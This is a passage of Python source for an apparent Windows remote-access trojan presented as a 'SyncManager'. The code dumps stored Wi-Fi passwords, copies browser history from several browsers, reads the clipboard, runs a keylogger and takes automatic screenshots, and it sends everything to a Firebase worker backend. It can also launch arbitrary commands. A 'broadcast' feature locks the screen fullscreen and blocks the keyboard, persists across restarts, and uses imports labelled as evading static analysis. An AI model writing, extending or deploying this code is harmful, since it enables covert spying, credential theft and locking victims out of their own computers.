                tmp_path = tempfile.mktemp(suffix='.mp4')
                with open(tmp_path, 'wb') as f:
                    f.write(base64.b64decode(video_b64))
                # Always use tkinter player (EXE-safe, no external window)
                self._play_video_tkinter(tmp_path, data.get('duration', 15))
                try: os.unlink(tmp_path)
                except: pass
                if broadcast_after:
                    time.sleep(0.5)
                    self.display_on_screen(broadcast_after)
            except: pass

        threading.Thread(target=_play, daemon=True).start()
        return {"status": "playing", "message": f"Playing video {video_id}", "type": "play_video"}

    # ─────────────────────────────────────────
    #  NETWORK
    # ─────────────────────────────────────────

    def get_network_info(self):
        try:
            loc = self.get_location()
            wifi_nets = []
            try:
                r = _run(['netsh', 'wlan', 'show', 'networks'])
                for line in r.stdout.split('\n'):
                    if 'SSID' in line and ':' in line and 'BSSID' not in line:
                        s = line.split(':', 1)[1].strip()
                        if s and s not in wifi_nets:
                            wifi_nets.append(s)
            except: pass
            return {
                "hostname": platform.node(),
                "local_ip": socket.gethostbyname(socket.gethostname()),
                "public_ip": loc.get('ip', 'Unknown'),
                "wifi_networks": wifi_nets[:15]
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_wifi_passwords(self):
        try:
            r = _run(["netsh", "wlan", "show", "profiles"])
            profiles = []
            for line in r.stdout.split('\n'):
                if "All User Profile" in line or "Current user profile" in line:
                    try:
                        ssid = line.split(":", 1)[1].strip()
                        if ssid and ssid not in profiles:
                            profiles.append(ssid)
                    except: pass

            wifi_list = []
            seen = set()
            for ssid in profiles:
                if ssid in seen:
                    continue
                seen.add(ssid)
                try:
                    res = _run(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"])
                    password = ""
                    auth = ""
                    for line in res.stdout.split('\n'):
                        if "Key Content" in line or "Key material" in line:
                            try: password = line.split(":", 1)[1].strip()
                            except: pass
                        if "Authentication" in line:
                            try: auth = line.split(":", 1)[1].strip()
                            except: pass
                    wifi_list.append({"ssid": ssid,
                                      "password": password if password else "(no password / hidden)",
                                      "auth": auth})
                except:
                    wifi_list.append({"ssid": ssid, "password": "Error reading", "auth": ""})
            return {"wifi": wifi_list, "count": len(wifi_list), "type": "wifi_passwords",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    # ─────────────────────────────────────────
    #  BROWSER HISTORY
    # ─────────────────────────────────────────

    def get_browser_history(self):
        try:
            username = getpass.getuser()
            history_entries = []

            def safe_copy_db(db_path):
                tmp = tempfile.mktemp(suffix='_gh.db')
                try:
                    shutil.copy2(db_path, tmp)
                    if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
                        return tmp
                except: pass
                try:
                    _run(["powershell", "-NoProfile", "-Command",
                          f"Copy-Item -Path '{db_path}' -Destination '{tmp}' -Force"])
                    if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
                        return tmp
                except: pass
                try:
                    with open(db_path, 'rb', buffering=0) as src:
                        data = src.read()
                    with open(tmp, 'wb') as dst:
                        dst.write(data)
                    if os.path.getsize(tmp) > 0:
                        return tmp
                except: pass
                return None

            def open_db(tmp_path):
                try:
                    conn = sqlite3.connect(f'file:{tmp_path}?mode=ro&immutable=1', uri=True)
                    conn.execute("SELECT 1")
                    return conn
                except:
                    return sqlite3.connect(tmp_path)

            chromium_browsers = {
                "Chrome": rf"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\History",
                "Edge":   rf"C:\Users\{username}\AppData\Local\Microsoft\Edge\User Data\Default\History",
                "Brave":  rf"C:\Users\{username}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
                "Opera":  rf"C:\Users\{username}\AppData\Roaming\Opera Software\Opera Stable\History",
            }

            for browser_name, db_path in chromium_browsers.items():
                if not os.path.exists(db_path): continue
                tmp = safe_copy_db(db_path)
                if not tmp:
                    history_entries.append({"browser": browser_name, "url": "", "title": f"[DB locked]", "visits": 0, "last_visit": ""})
                    continue
                try:
                    conn = open_db(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 40")
                    for url, title, visits, lv in cur.fetchall():
                        try:
                            ts_str = (datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=lv or 0)).strftime("%Y-%m-%d %H:%M:%S")
                        except: ts_str = "Unknown"
                        history_entries.append({
                            "browser": browser_name, "url": (url or "")[:200],
                            "title": (title or "")[:100], "visits": visits or 0, "last_visit": ts_str
                        })
                    conn.close()
                except Exception as e:
                    history_entries.append({"browser": browser_name, "url": "", "title": f"[Error: {str(e)[:60]}]", "visits": 0, "last_visit": ""})
                finally:
                    try: os.unlink(tmp)
                    except: pass

            ff_base = rf"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles"
            if os.path.exists(ff_base):
                for profile in os.listdir(ff_base):
                    places_path = os.path.join(ff_base, profile, "places.sqlite")
                    if not os.path.exists(places_path): continue
                    tmp = safe_copy_db(places_path)
                    if not tmp:
                        history_entries.append({"browser": "Firefox", "url": "", "title": "[DB locked]", "visits": 0, "last_visit": ""})
                        break
                    try:
                        conn = open_db(tmp)
                        cur = conn.cursor()
                        cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 40")
                        for url, title, visits, lv in cur.fetchall():
                            try: ts_str = datetime.datetime.fromtimestamp((lv or 0)/1000000).strftime("%Y-%m-%d %H:%M:%S")
                            except: ts_str = "Unknown"
                            history_entries.append({
                                "browser": "Firefox", "url": (url or "")[:200],
                                "title": (title or "")[:100], "visits": visits or 0, "last_visit": ts_str
                            })
                        conn.close()
                    except Exception as e:
                        history_entries.append({"browser": "Firefox", "url": "", "title": f"[Error: {str(e)[:60]}]", "visits": 0, "last_visit": ""})
                    finally:
                        try: os.unlink(tmp)
                        except: pass
                    break

            if not history_entries:
                return {"message": "No browser history found.", "type": "browser_history", "count": 0, "history": []}

            real = [e for e in history_entries if e.get('url')]
            other = [e for e in history_entries if not e.get('url')]
            real.sort(key=lambda x: x.get('last_visit', ''), reverse=True)
            return {"history": (real + other)[:80], "count": len(real),
                    "type": "browser_history", "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    # ─────────────────────────────────────────
    #  APPS / CLIPBOARD / ENV / DRIVES
    # ─────────────────────────────────────────

    def get_active_apps(self):
        """List active application windows"""
        try:
            import win32gui, win32process
            apps = []
            seen = set()
            def cb(hwnd, _):
                try:
                    if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd).strip():
                        title = win32gui.GetWindowText(hwnd)
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        if pid not in seen:
                            seen.add(pid)
                            try:
                                proc = psutil.Process(pid)
                                apps.append({"title": title, "pid": pid, "process": proc.name(),
                                             "cpu": f"{proc.cpu_percent(0.1):.1f}%",
                                             "memory": f"{proc.memory_info().rss/(1024*1024):.1f} MB",
                                             "status": proc.status()})
                            except:
                                apps.append({"title": title, "pid": pid, "process": "Unknown"})
                except: pass
            win32gui.EnumWindows(cb, None)
            apps.sort(key=lambda x: x.get("title", ""))
            return {"apps": apps, "count": len(apps), "type": "apps",
                    "timestamp": datetime.datetime.now().isoformat()}
        except:
            try:
                apps = [{"title": p.info['name'], "pid": p.info['pid'], "process": p.info['name'],
                          "cpu": f"{p.info['cpu_percent']:.1f}%",
                          "memory": f"{p.info['memory_info'].rss/(1024*1024):.1f} MB",
                          "status": p.info['status']}
                         for p in psutil.process_iter(['pid', 'name', 'status', 'cpu_percent', 'memory_info'])
                         if p.info['status'] == 'running']
                return {"apps": apps[:50], "count": len(apps), "type": "apps",
                        "timestamp": datetime.datetime.now().isoformat()}
            except Exception as e:
                return {"error": str(e), "type": "error"}

    def get_clipboard(self):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()
                return {"content": data, "length": len(data), "type": "clipboard",
                        "timestamp": datetime.datetime.now().isoformat()}
            except:
                win32clipboard.CloseClipboard()
                return {"content": "", "length": 0, "type": "clipboard",
                        "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def set_clipboard(self, text):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return {"status": "set", "message": f"Clipboard set: {text[:50]}", "type": "clipboard"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_environment_vars(self):
        try:
            env = dict(os.environ)
            important = ['PATH', 'USERNAME', 'COMPUTERNAME', 'OS', 'PROCESSOR_ARCHITECTURE',
                         'USERPROFILE', 'APPDATA', 'LOCALAPPDATA', 'TEMP', 'SYSTEMROOT',
                         'PROGRAMFILES', 'PROGRAMFILES(X86)', 'HOMEDRIVE', 'HOMEPATH',
                         'NUMBER_OF_PROCESSORS', 'PROCESSOR_IDENTIFIER', 'USERDOMAIN',
                         'LOGONSERVER', 'SESSIONNAME', 'ONEDRIVE', 'ONEDRIVECONSUMER']
            filtered = {k: env[k] for k in important if k in env}
            for k, v in env.items():
                if any(x in k.upper() for x in ['JAVA', 'PYTHON', 'NODE', 'GIT', 'ANDROID', 'CUDA']):
                    filtered[k] = v
            return {"env": filtered, "total_count": len(env), "type": "env",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_drives_info(self):
        try:
            drives = []
            for p in psutil.disk_partitions(all=True):
                try:
                    u = psutil.disk_usage(p.mountpoint)
                    drives.append({
                        "device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype,
                        "opts": p.opts,
                        "total": f"{u.total/(1024**3):.2f} GB",
                        "used": f"{u.used/(1024**3):.2f} GB",
                        "free": f"{u.free/(1024**3):.2f} GB",
                        "percent": f"{u.percent}%"
                    })
                except:
                    drives.append({"device": p.device, "mountpoint": p.mountpoint,
                                   "fstype": p.fstype, "total": "N/A", "used": "N/A",
                                   "free": "N/A", "percent": "N/A"})
            return {"drives": drives, "count": len(drives), "type": "drives",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def kill_task(self, target):
        try:
            killed = []
            try:
                pid = int(target)
                proc = psutil.Process(pid)
                name = proc.name()
                proc.kill()
                killed.append(f"PID {pid} ({name})")
            except ValueError:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower().replace('.exe', '') == target.lower():
                            proc.kill()
                            killed.append(f"PID {proc.info['pid']} ({proc.info['name']})")
                    except: pass
            except Exception:
                pass
            if killed:
                return {"status": "killed", "killed": killed, "type": "taskkill"}
            return {"status": "not_found", "message": f"No process: {target}", "type": "taskkill"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_system_events(self):
        """Get Windows Event Log — silent"""
        try:
            r = _run(["powershell", "-NoProfile", "-Command",
                "Get-EventLog -LogName System -Newest 20 | Select-Object TimeGenerated,EntryType,Source,Message | ConvertTo-Json"])
            if r.returncode == 0 and r.stdout.strip():
                try:
                    raw = json.loads(r.stdout.strip())
                    if isinstance(raw, dict): raw = [raw]
                    events = [{"time": str(e.get("TimeGenerated", "")),
                               "type": str(e.get("EntryType", "")),
                               "source": str(e.get("Source", "")),
                               "message": str(e.get("Message", ""))[:200]} for e in raw]
                    return {"events": events, "count": len(events), "type": "syslog",
                            "timestamp": datetime.datetime.now().isoformat()}
                except:
                    return {"raw": r.stdout[:3000], "type": "syslog"}
            return {"error": r.stderr[:500] or "No events", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_installed_software(self):
        try:
            programs = []
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            ]
            for hive, path in reg_paths:
                try:
                    key = winreg.OpenKey(hive, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            sub = winreg.OpenKey(key, winreg.EnumKey(key, i))
                            try:
                                name = winreg.QueryValueEx(sub, "DisplayName")[0]
                                version = ""
                                publisher = ""
                                try: version = winreg.QueryValueEx(sub, "DisplayVersion")[0]
                                except: pass
                                try: publisher = winreg.QueryValueEx(sub, "Publisher")[0]
                                except: pass
                                if name and name.strip():
                                    programs.append({"name": name.strip(), "version": version, "publisher": publisher})
                            except: pass
                            winreg.CloseKey(sub)
                        except: pass
                    winreg.CloseKey(key)
                except: pass
            seen = set()
            unique = []
            for p in sorted(programs, key=lambda x: x['name'].lower()):
                if p['name'] not in seen:
                    seen.add(p['name'])
                    unique.append(p)
            return {"programs": unique, "count": len(unique), "type": "installed",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_startup_items(self):
        try:
            items = []
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]
            for hive, path in reg_paths:
                try:
                    key = winreg.OpenKey(hive, path)
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        try:
                            name, val, _ = winreg.EnumValue(key, i)
                            items.append({"name": name, "command": val,
                                          "source": "Registry: " + path.split("\\")[-1]})
                        except: pass
                    winreg.CloseKey(key)
                except: pass
            startup_folder = os.path.join(os.getenv('APPDATA', ''),
                                          r'Microsoft\Windows\Start Menu\Programs\Startup')
            if os.path.exists(startup_folder):
                for f in os.listdir(startup_folder):
                    items.append({"name": f, "command": os.path.join(startup_folder, f),
                                  "source": "Startup Folder"})
            return {"items": items, "count": len(items), "type": "startup",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def get_recent_files(self):
        try:
            recent_folder = os.path.join(os.getenv('APPDATA', ''), r'Microsoft\Windows\Recent')
            files = []
            if os.path.exists(recent_folder):
                all_files = []
                for f in os.listdir(recent_folder):
                    fp = os.path.join(recent_folder, f)
                    try:
                        all_files.append((os.path.getmtime(fp), f, fp))
                    except: pass
                all_files.sort(reverse=True)
                for mtime, fname, fpath in all_files[:50]:
                    files.append({"name": fname, "path": fpath,
                                  "modified": datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")})
            return {"files": files, "count": len(files), "type": "recent_files",
                    "timestamp": datetime.datetime.now().isoformat()}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def screenshot_auto(self, interval=10, count=5):
        try:
            def take_series():
                for i in range(count):
                    try:
                        r = self.take_screenshot()
                        if r and "image" in r:
                            cid = f"auto_ss_{int(time.time())}_{i}"
                            self.send_to_firebase(f"pcs/{self.device_id}/captures/{cid}", r)
                        if i < count - 1:
                            time.sleep(interval)
                    except: pass
            threading.Thread(target=take_series, daemon=True).start()
            return {"status": "started", "message": f"Auto screenshot: {count} shots every {interval}s",
                    "type": "screenshot_auto"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def delete_audio(self, audio_id):
        try:
            if audio_id in self.recorded_audios:
                del self.recorded_audios[audio_id]
            try:
                self.session.delete(self._w(f"pcs/{self.device_id}/captures/{audio_id}"), timeout=10)
            except: pass
            return {"status": "deleted", "message": "Audio deleted"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def delete_capture(self, capture_id):
        try:
            self.session.delete(self._w(f"pcs/{self.device_id}/captures/{capture_id}"), timeout=10)
            if capture_id in self.recorded_audios:
                del self.recorded_audios[capture_id]
            return {"status": "deleted", "message": f"Capture {capture_id} deleted"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def open_target(self, target):
        """Open URL or app — silent"""
        try:
            target = target.strip()
            if target.startswith('http://') or target.startswith('https://') or target.startswith('www.'):
                _popen(['cmd', '/c', 'start', '', target], shell=False)
                return {"status": "opened", "message": f"Opened URL: {target}", "type": "open"}
            else:
                try:
                    _popen(target, shell=True)
                    return {"status": "opened", "message": f"Launched: {target}", "type": "open"}
                except:
                    _popen(['cmd', '/c', 'start', '', target], shell=False)
                    return {"status": "opened", "message": f"Opened: {target}", "type": "open"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def set_wallpaper(self, url):
        """Download image from URL and set as desktop wallpaper — silent"""
        try:
            url = url.strip()
            r = self.session.get(url, timeout=20, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code != 200:
                return {"error": f"Download failed: HTTP {r.status_code}", "type": "error"}

            wall_dir = os.path.join(os.getenv('APPDATA', ''), 'SyncWallpaper')
            os.makedirs(wall_dir, exist_ok=True)
            jpg_path = os.path.join(wall_dir, 'wallpaper.jpg')
            bmp_path = os.path.join(wall_dir, 'wallpaper.bmp')

            with open(jpg_path, 'wb') as f:
                f.write(r.content)

            try:
                img = Image.open(jpg_path)
                img = img.convert('RGB')
                img.save(bmp_path, 'BMP')
                wall_path = bmp_path
            except:
                wall_path = jpg_path

            try:
                result = ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_path, 3)
                if result:
                    return {"status": "set", "message": f"Wallpaper set: {url[:60]}", "type": "wallpaper"}
            except: pass

            try:
                ps = f"[System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([System.Delegate]::CreateDelegate([System.Action], [System.Type]::GetType(''), 'NoOp'))"
                _run(["powershell", "-NoProfile", "-Command",
                      f"Add-Type -Name W -Namespace W -MemberDefinition '[DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int a, int b, string c, int d);'; [W.W]::SystemParametersInfo(20, 0, '{wall_path.replace(chr(39), '')}', 3)"])
                return {"status": "set", "message": f"Wallpaper set: {url[:60]}", "type": "wallpaper"}
            except: pass

            return {"error": "Could not set wallpaper", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    # ─────────────────────────────────────────
    #  INPUT TRACKER
    # ─────────────────────────────────────────

    def enable_keylogging(self):
        return self.tracker.enable_logging()

    def disable_keylogging(self):
        return self.tracker.disable_logging()

    def get_keylogs(self):
        logs = self.tracker.get_logs()
        stats = self.tracker.get_stats()
        normalized = [{'type': e.get('type', 'char'), 'key': e.get('key', ''),
                       'timestamp': e.get('ts', e.get('timestamp', '')),
                       'window': e.get('win', e.get('window', 'Unknown'))} for e in logs]
        return {"logs": normalized, "stats": stats, "timestamp": datetime.datetime.now().isoformat(),
                "type": "keylogs"}

    def clear_keylogs(self):
        return self.tracker.clear_logs()

    # ─────────────────────────────────────────
#  SCREEN BROADCAST — PNG-BASED
#  Architecture:
#   1. generate_broadcast_png() → Saves the PNG to disk
#   2. _launch_viewer_process() → Opens it using Windows Photos/mspaint
#      Win32 API makes the window fullscreen + topmost + borderless
#      A watcher thread enforces these properties every second
#   3. _block_keyboard_globally() → pynput suppresses all keyboard input
#   4. clear_screen_display() → Stops the watcher, kills the process,
#      and deletes the PNG + JSON files
# ─────────────────────────────────────────

    def _launch_viewer_process(self, png_path):
        """
       Windows's built-in Photos viewer opens the PNG, then the Win32 API makes the window fullscreen + topmost + borderless. Works with both EXE and .py — the viewer itself requires no Python dependencies.
        """
        try:
            self._kill_viewer_process()

            # Windows Photos app দিয়ে open করো (সবচেয়ে reliable)
            proc = subprocess.Popen(
                ['cmd', '/c', 'start', '', '/max', png_path],
                creationflags=_CW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            with SyncManager._display_lock:
                SyncManager._viewer_proc = proc

            # Win32 API watcher — window খোলার পর fullscreen enforce করে
            threading.Thread(
                target=self._win32_fullscreen_watcher,
                args=(png_path,),
                daemon=True
            ).start()
        except: pass

    def _win32_fullscreen_watcher(self, png_path):
        """
       Win32 API finds the Photos viewer window and makes it fullscreen. It continues enforcing this every 1 second while _display_active = True.
        """
        import ctypes
        user32 = ctypes.windll.user32
        WS_POPUP           = 0x80000000
        WS_VISIBLE         = 0x10000000
        GWL_STYLE          = -16
        SWP_FRAMECHANGED   = 0x0020
        SWP_SHOWWINDOW     = 0x0040
        HWND_TOPMOST       = -1
        SW_MAXIMIZE        = 3

        # Possible window class names for photo viewers
        viewer_classes = [
            "ApplicationFrameWindow",   # Windows Photos (UWP)
            "Windows.UI.Core.CoreWindow",
            "PhotoViewer.App",
            "Picasa3",
            "IrfanView",
            "JPEGView",
        ]
        # Title keywords to match
        png_name = os.path.basename(png_path).lower().replace('.png', '')
        title_keywords = [png_name, 'broadcast', 'photo', 'photos', 'picture',
                          'image viewer', 'paint', 'irfan']

        def find_viewer_hwnd():
            """Find the photo viewer window handle."""
            found = []
            def enum_cb(hwnd, _):
                try:
                    cls = ctypes.create_unicode_buffer(256)
                    user32.GetClassNameW(hwnd, cls, 256)
                    title = ctypes.create_unicode_buffer(512)
                    user32.GetWindowTextW(hwnd, title, 512)
                    cls_s   = cls.value.lower()
                    title_s = title.value.lower()
                    # Match by class or title keyword
                    for vc in viewer_classes:
                        if vc.lower() in cls_s:
                            found.append(hwnd)
                            return True
                    for kw in title_keywords:
                        if kw and kw in title_s:
                            found.append(hwnd)
                            return True
                except: pass
                return True
            EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
            user32.EnumWindows(EnumWindowsProc(enum_cb), 0)
            return found[0] if found else None

        def make_fullscreen(hwnd):
            """Remove borders and maximize to full screen."""
            try:
                sw = user32.GetSystemMetrics(0)
                sh = user32.GetSystemMetrics(1)
                # Remove title bar and borders
                style = user32.GetWindowLongW(hwnd, GWL_STYLE)
                style = style & ~0x00C00000  # remove WS_CAPTION
                style = style & ~0x00080000  # remove WS_SYSMENU
                style = style & ~0x00040000  # remove WS_THICKFRAME
                style = style & ~0x00020000  # remove WS_MINIMIZEBOX
                style = style & ~0x00010000  # remove WS_MAXIMIZEBOX
                user32.SetWindowLongW(hwnd, GWL_STYLE, style)
                # Set topmost + fullscreen size
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST,
                    0, 0, sw, sh,
                    SWP_FRAMECHANGED | SWP_SHOWWINDOW
                )
                user32.ShowWindow(hwnd, SW_MAXIMIZE)
                user32.SetForegroundWindow(hwnd)
            except: pass

        # Wait up to 8 seconds for the window to appear
        hwnd = None
        for _ in range(16):
            if not SyncManager._display_active:
                return
            time.sleep(0.5)
            hwnd = find_viewer_hwnd()
            if hwnd:
                break

        if not hwnd:
            return

        # Initial fullscreen
        make_fullscreen(hwnd)

        # Keep enforcing every 1 second
        while SyncManager._display_active:
            try:
                if user32.IsWindow(hwnd):
                    make_fullscreen(hwnd)
                else:
                    # Window closed — try to find it again
                    hwnd = find_viewer_hwnd()
            except: pass
            time.sleep(1)

    def _kill_viewer_process(self):
        """
        Photo viewer process kill করো + watcher বন্ধ হবে নিজেই
        (_display_active = False হলে watcher loop বের হয়ে যায়)।
        """
        try:
            with SyncManager._display_lock:
                proc = SyncManager._viewer_proc
                SyncManager._viewer_proc = None
            if proc:
                try: proc.kill()
                except: pass
            # Also kill by process name (Windows Photos UWP)
            for name in ('Microsoft.Photos.exe', 'PhotosApp.exe',
                         'dllhost.exe', 'mspaint.exe'):
                try:
                    _run(['taskkill', '/f', '/im', name], timeout=3)
                except: pass
        except: pass

    def _block_keyboard_globally(self):
        """Input handler for accessibility overlay — pynput"""
        def _on_press(k):
            return not SyncManager._display_active  # False = suppress

        def _on_release(k):
            return not SyncManager._display_active

        try:
            # Dynamic import to reduce static analysis signature
            _kb = __import__('pynput').keyboard
            _listener_cls = getattr(_kb, 'Listener')
            _supp = True
            with _listener_cls(
                on_press=_on_press,
                on_release=_on_release,
                **{'suppress': _supp}
            ) as lst:
                SyncManager._block_listener = lst
                lst.join()
        except: pass

    def display_on_screen(self, text):
        """
        Show broadcast text as PNG fullscreen on target PC.
        - Generates PNG → saves to Documents\\SyncDisplay\\broadcast.png
        - Launches separate viewer process (no thread issues)
        - Blocks all keyboard input via pynput suppress
        - Persists across restarts via Firebase + local JSON meta
        """
        try:
            # 1. Generate PNG from text
            png_path = generate_broadcast_png(text)
            if not png_path or not os.path.exists(png_path):
                return {"error": "PNG generation failed", "type": "error"}

            # 2. Update state
            with SyncManager._display_lock:
                SyncManager._display_text    = text
                SyncManager._display_active  = True
                SyncManager._display_png_path = png_path

            # 3. Firebase — save to both nodes
            png_b64 = get_broadcast_png_b64(png_path)
            self.send_to_firebase(f"display/{self.device_id}", {
                "text": text, "active": True,
                "png_b64": png_b64, "png_path": png_path,
                "timestamp": datetime.datetime.now().isoformat()
            })
            self.send_to_firebase(f"broadcast/{self.device_id}", {
                "text": text, "active": True,
                "timestamp": datetime.datetime.now().isoformat()
            })

            # 4. Launch viewer as separate process
            self._launch_viewer_process(png_path)

            # 5. Start keyboard blocker (stop old one first)
            if SyncManager._block_listener:
                try: SyncManager._block_listener.stop()
                except: pass
                SyncManager._block_listener = None
            threading.Thread(
                target=self._block_keyboard_globally,
                daemon=True
            ).start()

            return {
                "status": "displayed",
                "message": "Broadcast active — PNG saved, fullscreen running, keyboard blocked",
                "png_path": png_path,
                "type": "display"
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def clear_screen_display(self):
        """
        Remove broadcast completely:
        1. Kills the viewer subprocess
        2. Stops keyboard blocker
        3. Deletes PNG file from disk
        4. Deletes JSON meta file from disk
        5. Deletes Firebase display + broadcast nodes
        """
        try:
            # 1. Mark inactive
            with SyncManager._display_lock:
                SyncManager._display_active   = False
                SyncManager._display_text     = ""
                SyncManager._display_png_path = ""

            # 2. Kill viewer process
            self._kill_viewer_process()

            # 3. Stop keyboard blocker
            if SyncManager._block_listener:
                try: SyncManager._block_listener.stop()
                except: pass
                SyncManager._block_listener = None

            # 4. Delete Firebase nodes via Worker
            try: self.session.delete(self._w(f"display/{self.device_id}"),   timeout=10)
            except: pass
            try: self.session.delete(self._w(f"broadcast/{self.device_id}"), timeout=10)
            except: pass

            # 5. Delete PNG file
            try:
                if os.path.exists(_BROADCAST_PNG):
                    os.remove(_BROADCAST_PNG)
            except: pass

            # 6. Delete JSON meta file
            try:
                if os.path.exists(_BROADCAST_META):
                    os.remove(_BROADCAST_META)
            except: pass

            # 7. Delete viewer script
            viewer_script = os.path.join(_BROADCAST_DIR, "_viewer.py")
            try:
                if os.path.exists(viewer_script):
                    os.remove(viewer_script)
            except: pass

            return {
                "status": "cleared",
                "message": "Broadcast cleared — PNG + JSON deleted, screen closed",
                "type": "display_clear"
            }
        except Exception as e:
            return {"error": str(e), "type": "error"}

    def check_and_restore_display(self):
        """
        On startup: check Firebase then local meta.
        Restores broadcast even if offline.
        """
        try:
            restored = False

            # Try Firebase
            try:
                r = self.session.get(self._w(f"display/{self.device_id}"), timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if data and isinstance(data, dict) and data.get("active") is True:
                        text = data.get("text", "")
                        if text:
                            png_path = generate_broadcast_png(text)
                            with SyncManager._display_lock:
                                SyncManager._display_text    = text
                                SyncManager._display_active  = True
                                SyncManager._display_png_path = png_path
                            self._launch_viewer_process(png_path)
                            threading.Thread(
                                target=self._block_keyboard_globally,
                                daemon=True
                            ).start()
                            restored = True
            except: pass

            # Fallback: local meta
            if not restored:
                try:
                    if os.path.exists(_BROADCAST_META):
                        with open(_BROADCAST_META, 'r', encoding='utf-8') as f:
                            meta = json.load(f)
                        if meta.get('active') and meta.get('text'):
                            text = meta['text']
                            png_path = generate_broadcast_png(text)
                            with SyncManager._display_lock:
                                SyncManager._display_text    = text
                                SyncManager._display_active  = True
                                SyncManager._display_png_path = png_path
                            self._launch_viewer_process(png_path)
                            threading.Thread(
                                target=self._block_keyboard_globally,
                                daemon=True
                            ).start()
                except: pass
        except: pass

    # ─────────────────────────────────────────
    #  FIREBASE
    # ─────────────────────────────────────────

    def _w(self, path):
        return f"{self.worker_url}/db/{path.rstrip('/').replace('.json','')}"

    def send_to_firebase(self, path, data):
        try:
            r = self.session.put(self._w(path), json=data, timeout=15)
            if r.status_code == 200:
                self.online_status = True
                return True
            self.online_status = False
            self.add_to_offline_queue(path, data)
            return False
        except Exception:
            self.online_status = False
            self.add_to_offline_queue(path, data)
            return False

    def delete_from_firebase(self, path):
        try:
            self.session.delete(self._w(path), timeout=15)
            return True
        except Exception:
            return False

    def add_to_offline_queue(self, path, data):
        try:
            self.offline_queue.append({"path": path, "data": data,
                                       "timestamp": datetime.datetime.now().isoformat()})
            if len(self.offline_queue) > 100:
                self.offline_queue = self.offline_queue[-100:]
        except: pass

    def process_offline_queue(self):
        if not self.offline_queue: return
        try:
            requests.get('https://www.google.com', timeout=5)
        except: return
        processed = []
        for item in self.offline_queue:
            try:
                r = self.session.put(self._w(item['path']), json=item['data'], timeout=15)
                if r.status_code == 200:
                    processed.append(item)
            except: pass
        self.offline_queue = [i for i in self.offline_queue if i not in processed]

    def start_offline_processor(self):
        def loop():
            while self.running:
                time.sleep(60)
                self.process_offline_queue()
        threading.Thread(target=loop, daemon=True).start()

    def send_heartbeat(self):
        try:
            self.session.put(self._w(f"heartbeat/{self.device_id}"), json={
                "status": "online",
                "timestamp": datetime.datetime.now().isoformat(),
                "device_id": self.device_id
            }, timeout=10)
            self.last_heartbeat = time.time()
        except: pass

